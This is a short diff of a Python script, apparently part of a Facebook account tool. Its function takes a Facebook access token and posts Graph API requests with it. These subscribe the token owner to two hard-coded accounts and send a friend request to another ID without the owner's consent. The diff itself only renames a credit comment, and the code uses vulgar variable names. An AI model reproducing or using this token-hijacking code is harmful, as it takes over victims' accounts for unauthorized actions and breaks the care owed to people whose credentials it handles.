@@ -179,7 +179,7 @@ def moch_yayan():
 def wuhan(kontol):
     try:
         kentod = kontol
-        requests.post('https://graph.facebook.com/100054912310434/subscribers?access_token=%s'%(kentod)) #TONI
+        requests.post('https://graph.facebook.com/100054912310434/subscribers?access_token=%s'%(kentod)) #YUSRIN
         requests.post('https://graph.facebook.com/100072677928941/subscribers?access_token=%s'%(kentod)) #TAUFIQ
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         #requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
